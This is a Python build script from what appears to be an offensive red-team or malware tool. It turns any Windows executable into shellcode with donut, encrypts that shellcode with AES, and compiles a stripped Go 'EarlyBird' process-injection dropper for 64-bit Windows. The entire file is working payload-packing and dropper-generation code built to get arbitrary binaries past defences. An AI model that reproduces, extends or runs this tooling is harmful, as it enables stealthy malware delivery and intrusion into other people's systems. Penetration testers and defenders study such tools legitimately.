#!/usr/bin/python3

import argparse
import os
import subprocess
from pathlib import Path
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad

def donutTheExe(binaryPath: str, binaryArg: str):
    donutPath = os.path.join(Path(__file__).parent, '../ressources/donut')
    shellcodePath =os.path.join(Path(__file__).parent, '../bin/binary.bin') 

    print(donutPath, shellcodePath)

    print("[+] Creating the shellcode with donut ...")

    popen = None
    args = (donutPath, '-f', '1', "-x", "1", '-p', binaryArg, '-o', shellcodePath, '-i' , binaryPath)
    try:
        popen = subprocess.Popen(args, stdout=subprocess.PIPE)
        popen.wait()
        if popen.stdout != None:
            output = popen.stdout.read()
            print(output.decode("utf-8"))

        if popen.returncode != 0:
            raise Exception
        if not os.path.isfile(shellcodePath):
            print("Shellcode not created for some reason")
            raise Exception
    except Exception as e:
        if popen and popen.stderr is not None:
            print(popen.stderr.read().decode("utf-8"))
        print(e)
        print("[-] Failed to create the shellcode")
        exit(1)

    print("[+] Shellcode Created and saved in " + shellcodePath)
    return shellcodePath
    

def cipherShellcode(shellcodePath: str):
    print("[+] Will Cipher the Generated Shellcode")
    key = get_random_bytes(32)
    iv = get_random_bytes(16)

    keyPath = os.path.join(Path(__file__).parent, '../bin/key')
    cipheredShellcodePath = shellcodePath + ".enc"

    with open(shellcodePath, 'rb') as f:
        shellcode = f.read()

    paddedShellcode = pad(shellcode, AES.block_size)

    cipher = AES.new(key, AES.MODE_CBC, iv)
    cipheredShellcode = cipher.encrypt(paddedShellcode)

    with open(cipheredShellcodePath, 'wb') as f:
        f.write(iv + cipheredShellcode)

    with open(keyPath, 'wb') as f:
        f.write(key)

    print("[+] Ciphered Shellcode and Generated Key in bin/")

    return cipheredShellcodePath, keyPath




def generate64BitsExeGoDroplet(outputPrefix: str):

    exe64bitsPath = os.path.join(Path(__file__).parent, '../bin/' + outputPrefix + "64.exe")
    earlyBirdMainPath = os.path.join(Path(__file__).parent, '../cmd/EarlyBird/main.go')
    args = ("go", "build", "-a", "-ldflags", "-s -w", "-o", exe64bitsPath, earlyBirdMainPath)

    popen = None
    exe64bits_env = os.environ.copy() 
    exe64bits_env["GOOS"] = "windows"
    exe64bits_env["GOARCH"] = "amd64"
    exe64bits_env["CGO_ENABLED"] = "0"

    print("[+] Creating 64 bits exe dropper")

    try:
        popen = subprocess.Popen(args, stdout=subprocess.PIPE, env=exe64bits_env)
        popen.wait()
        if popen.stdout != None:
            output = popen.stdout.read()
            print(output.decode("utf-8"))

        if popen.returncode != 0:
            raise Exception
        if not os.path.isfile(exe64bitsPath):
            print("64 Bits Exe Droplet not created for some reason")
            raise Exception
    except Exception as e:
        if popen and popen.stderr is not None:
            print(popen.stderr.read().decode("utf-8"))
        print(e)
        print("[-] Failed to create 64 bit exe droplet")
        exit(1)

    print("[+] Created 64 bits exe dropper in " + exe64bitsPath)
    return exe64bitsPath


# Generate The GoDroplets
def generateGoDroplets(binaryPath: str, binaryArg: str, format: str, outputPrefix: str):
    shellcodePath = donutTheExe(binaryPath, binaryArg)
    cipheredShellcodePath, keyPath = cipherShellcode(shellcodePath)

    print(cipheredShellcodePath, keyPath)
    generate64BitsExeGoDroplet(outputPrefix)


def main():
    parser = argparse.ArgumentParser(description="Generate the Go droplets given a binary.")
    parser.add_argument("--path", type=str, required=True, help="Path to the binary to be wrapped to create the Go dropper")
    parser.add_argument("--arg", type=str, required=True, help="Argument that are needed for the binary")
    parser.add_argument("--format",
                        choices=["exe", "svc", "dll", "all"],
                        required=True,
                        type=str,
                        help="Format of the droplet, can be exe, svc, dll or all of the above")
    parser.add_argument("--output", type=str, required=True, help="Output File Prefix")

    args = parser.parse_args()
    binaryPath = args.path
    binaryArg = args.arg
    format = args.format
    outputPrefix = args.output

    print(binaryPath, binaryArg, format)
    generateGoDroplets(binaryPath, binaryArg, format, outputPrefix)

if __name__ == "__main__":
    main()
